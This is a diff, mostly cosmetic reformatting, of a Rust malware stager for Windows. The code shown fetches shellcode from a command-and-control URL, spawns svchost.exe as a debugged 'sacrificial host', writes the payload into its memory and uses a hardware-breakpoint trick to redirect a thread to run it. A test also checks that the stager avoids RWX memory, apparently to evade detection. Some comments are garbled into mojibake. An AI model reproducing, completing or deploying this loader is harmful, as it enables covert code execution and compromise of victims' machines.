@@ -10,25 +10,27 @@ fn main() {
 }
 
 #[cfg(all(windows, target_arch = "x86_64"))]
-use std::ptr;
-#[cfg(all(windows, target_arch = "x86_64"))]
 use std::os::windows::ffi::OsStrExt;
 #[cfg(all(windows, target_arch = "x86_64"))]
-use winapi::um::processthreadsapi::*;
+use std::ptr;
 #[cfg(all(windows, target_arch = "x86_64"))]
-use winapi::um::memoryapi::*;
+use winapi::shared::minwindef::*;
+#[cfg(all(windows, target_arch = "x86_64"))]
+use winapi::um::debugapi::*;
 #[cfg(all(windows, target_arch = "x86_64"))]
 use winapi::um::handleapi::*;
 #[cfg(all(windows, target_arch = "x86_64"))]
-use winapi::um::debugapi::*;
+use winapi::um::memoryapi::*;
+#[cfg(all(windows, target_arch = "x86_64"))]
+use winapi::um::minwinbase::{
+    CREATE_PROCESS_DEBUG_EVENT, DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, EXCEPTION_SINGLE_STEP,
+};
+#[cfg(all(windows, target_arch = "x86_64"))]
+use winapi::um::processthreadsapi::*;
 #[cfg(all(windows, target_arch = "x86_64"))]
 use winapi::um::winbase::*;
 #[cfg(all(windows, target_arch = "x86_64"))]
 use winapi::um::winnt::*;
-#[cfg(all(windows, target_arch = "x86_64"))]
-use winapi::um::minwinbase::{DEBUG_EVENT, EXCEPTION_DEBUG_EVENT, CREATE_PROCESS_DEBUG_EVENT, EXCEPTION_SINGLE_STEP};
-#[cfg(all(windows, target_arch = "x86_64"))]
-use winapi::shared::minwindef::*;
 
 #[cfg(all(windows, target_arch = "x86_64"))]
 #[tokio::main]
@@ -45,7 +47,10 @@ async fn main() {
     // 2. Spawn sacrificial host (svchost.exe) as debuggee
     let target = "C:\\Windows\\System32\\svchost.exe";
     if let Some(pi) = spawn_target_as_debug(target) {
-        println!("[+] Target spawned and debugging active. PID: {}", pi.dwProcessId);
+        println!(
+            "[+] Target spawned and debugging active. PID: {}",
+            pi.dwProcessId
+        );
 
         // 3. 鎵ц纭欢鏂偣鍔寔娉ㄥ叆
         if hwbp_hijack_inject(pi, &shellcode) {
@@ -109,7 +114,7 @@ async fn fetch_core_shellcode() -> Vec<u8> {
             Ok(c) => c,
             Err(_) => return Vec::new(),
         };
-        
+
     let response = match client.get(&c2_url).send().await {
         Ok(r) => r,
         Err(_) => return Vec::new(),
@@ -118,7 +123,7 @@ async fn fetch_core_shellcode() -> Vec<u8> {
     if !response.status().is_success() {
         return Vec::new();
     }
-    
+
     match response.bytes().await {
         Ok(b) => b.to_vec(),
         Err(_) => Vec::new(),
@@ -150,7 +155,11 @@ fn spawn_target_as_debug(path: &str) -> Option<PROCESS_INFORMATION> {
             &mut pi,
         );
 
-        if success != 0 { Some(pi) } else { None }
+        if success != 0 {
+            Some(pi)
+        } else {
+            None
+        }
     }
 }
 
@@ -171,7 +180,9 @@ fn hwbp_hijack_inject(pi: PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
             PAGE_READWRITE,
         );
 
-        if remote_mem.is_null() { return false; }
+        if remote_mem.is_null() {
+            return false;
+        }
 
         if WriteProcessMemory(
             pi.hProcess,
@@ -201,7 +212,9 @@ fn hwbp_hijack_inject(pi: PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
 
         // 璋冭瘯寰幆澶勭悊
         loop {
-            if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 { break; }
+            if WaitForDebugEvent(&mut debug_event, INFINITE) == 0 {
+                break;
+            }
 
             match debug_event.dwDebugEventCode {
                 CREATE_PROCESS_DEBUG_EVENT => {
@@ -214,7 +227,8 @@ fn hwbp_hijack_inject(pi: PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
                     if exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP {
                         // HWBP fired: redirect RIP to shellcode
                         if !injected {
-                            let h_thread = OpenThread(THREAD_ALL_ACCESS, FALSE, debug_event.dwThreadId);
+                            let h_thread =
+                                OpenThread(THREAD_ALL_ACCESS, FALSE, debug_event.dwThreadId);
                             if !h_thread.is_null() {
                                 redirect_thread_to_shellcode(h_thread, remote_mem as usize);
                                 CloseHandle(h_thread);
@@ -228,8 +242,14 @@ fn hwbp_hijack_inject(pi: PROCESS_INFORMATION, shellcode: &[u8]) -> bool {
                 _ => {}
             }
 
-            ContinueDebugEvent(debug_event.dwProcessId, debug_event.dwThreadId, DBG_CONTINUE);
-            if injected { break; }
+            ContinueDebugEvent(
+                debug_event.dwProcessId,
+                debug_event.dwThreadId,
+                DBG_CONTINUE,
+            );
+            if injected {
+                break;
+            }
         }
     }
     injected
@@ -283,9 +303,7 @@ mod stager_mem_protect_tests {
             "stager must VirtualProtectEx after write"
         );
         // Alloc site must not request RWX
-        let alloc_idx = src
-            .find("VirtualAllocEx")
-            .expect("VirtualAllocEx present");
+        let alloc_idx = src.find("VirtualAllocEx").expect("VirtualAllocEx present");
         let protect_idx = src[alloc_idx..]
             .find("PAGE_")
             .map(|i| alloc_idx + i)
